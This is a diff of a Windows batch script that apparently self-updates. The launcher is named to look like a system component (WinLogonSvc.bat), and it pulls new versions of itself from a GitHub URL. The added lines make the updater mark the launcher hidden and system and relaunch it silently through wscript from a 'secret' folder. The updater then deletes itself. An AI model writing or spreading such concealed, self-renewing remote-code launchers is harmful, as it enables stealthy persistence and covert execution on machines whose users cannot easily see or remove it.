@@ -1,6 +1,6 @@
 @echo off
 setlocal enabledelayedexpansion
-set "LAUNCHER_VERSION=1.6"
+set "LAUNCHER_VERSION=1.7"
 set "LAUNCHER_VERSION_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/launcher_version.txt"
 set "LAUNCHER_SCRIPT_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/WinLogonSvc.bat"
 
@@ -37,6 +37,8 @@ if exist "%secretPath%\lv.tmp" (
                 echo @echo off
                 echo timeout /t 2 /nobreak ^> nul
                 echo move /Y "%launcherScriptPath%.new" "%launcherScriptPath%"
+                echo attrib +h +s "%launcherScriptPath%"
+                echo start "" /B wscript.exe "%vbsLauncherPath%" "%launcherScriptPath%"
                 echo del /f /q %%~f0
             ) > "%secretPath%\ul.bat"
             start "" /B wscript.exe "%vbsLauncherPath%" "%secretPath%\ul.bat"
@@ -48,6 +50,3 @@ if exist "%secretPath%\lv.tmp" (
 :eof
 endlocal
 exit /b
-
-
-
